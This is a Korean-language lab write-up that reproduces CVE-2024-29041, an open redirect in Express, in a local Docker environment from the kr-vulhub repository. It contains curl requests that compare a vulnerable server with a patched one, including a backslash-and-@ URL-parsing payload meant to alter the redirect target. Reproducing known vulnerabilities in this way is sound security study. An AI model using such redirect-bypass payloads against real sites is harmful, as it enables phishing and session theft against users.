# CVE-2024-29041: Express Open Redirect Vulnerability (PoC)

## 환경 구성

- OS: Windows 11
- Docker Version: 27.4.0
- docker-compose Version: 2.31.0

---

## 실습 준비

1. [gunh0/kr-vulhub](https://github.com/gunh0/kr-vulhub) 레포지토리 Fork 및 클론
```bash
git clone https://github.com/UserJ32/kr-vulhub.git

2. 취약점 폴더로 이동
cd kr-vulhub/express/CVE-2024-29041

3. `docker-compose up -d` 명령어로 컨테이너 실행
# 먼저, Docker Desktop 실행
docker-compose up -d
   - 8002 포트: 취약 서버
   - 8003 포트: 정상 서버

## 실습
## PART1. 기본 PoC (단순 리다이렉트 테스트)

1. 취약 서버(8002) 테스트
curl -i "http://localhost:8002/redirect?url=https://example.com"
- 결과 : 500 Internal Server Error (검증 부재로 인한 서버 오류)
![500 Internal Server Error](image-4.png)

2. 정상 서버(8003) 테스트
curl -i "http://localhost:8003/redirect?url=https://example.com"
결과 : 정상 처리 (에러 없음)
![normal](image-5.png)

3. 브라우저 테스트
- 취약 서버(8002) 접속 결과
![Error Browser](image-6.png)

- 정상 서버(8003) 접속 결과
![Normal Browser](image-7.png)

## 상세 설명
본 실습은 gunh0/kr-vulhub에서 제공하는 CVE-2024-29041 환경을 기반으로 하여, 
기본적인 오픈 리다이렉트 취약성 검증을 목적으로 진행되었습니다. 
추가로 Express 버전을 직접 수정하거나, 고급 URL 파싱 우회 기법은 본 실습 범위에 포함하지 않았습니다.

## Part 2. 고급 PoC (URL 파싱 트릭을 이용한 리다이렉션 시도)
1. 취약 서버(8002) 테스트
curl -i -X GET "http://localhost:8002?q=http://google.com%5C%5C@apple.com"
- 결과 : 500 Internal Server Error (검증 부재로 인한 서버 오류)
![8002](image-9.png)

2. 정상 서버(8003) 테스트
curl -i -X GET "http://localhost:8003?q=http://google.com%5C%5C@apple.com"
결과 : 정상 처리 (에러 없음)
![8003](image-8.png)

3. 브라우저 테스트
- 취약 서버(8002) 접속 결과
![8002 Browser2](image-10.png)

- 정상 서버(8003) 접속 결과
![8003 Browser2](image-11.png)

## 상세 설명
취약 서버는 입력된 특수 URL (\\@)을 검증 없이 Location 헤더에 반영하여, 브라우저나 파서에 따라 실제 리다이렉트 대상이 변경될 수 있는 위험이 있다. 예를 들어 http://google.com\\@apple.com 은 인증정보 부분 google.com이 무시되고, 실제 리다이렉션 대상이 apple.com이 되어버릴 수 있다. 이는 사용자 세션 탈취, 피싱 페이지 유도 등 다양한 공격에 악용될 수 있다.

## 최종 정리

- 기본 PoC를 통해 단순 입력 검증 부재를 확인했다.
- 고급 PoC를 통해 입력된 URL 파싱 트릭을 통한 인증 우회 및 리다이렉션 가능성을 검증했다.
- CVE-2024-29041 취약점은 Express 서버가 입력값을 제대로 검증하지 않고 Location 헤더에 반영하는 과정에서 발생하는 오픈 리다이렉트 취약점이다.

## Github 작업 이력

본 실습은 공개된 취약점 재현 레포지토리(gunh0/kr-vulhub)를 Fork하여, 취약한 Express 서버 환경(CVE-2024-29041)을 로컬에서 Docker로 직접 구성하고 테스트하는 방식으로 진행되었습니다.

- 원본 레포지토리: [https://github.com/gunh0/kr-vulhub](https://github.com/gunh0/kr-vulhub)
- Fork한 레포지토리: [https://github.com/UserJ32/kr-vulhub](https://github.com/UserJ32/kr-vulhub)

(※ 이후 Pull Request를 생성하였습니다.)
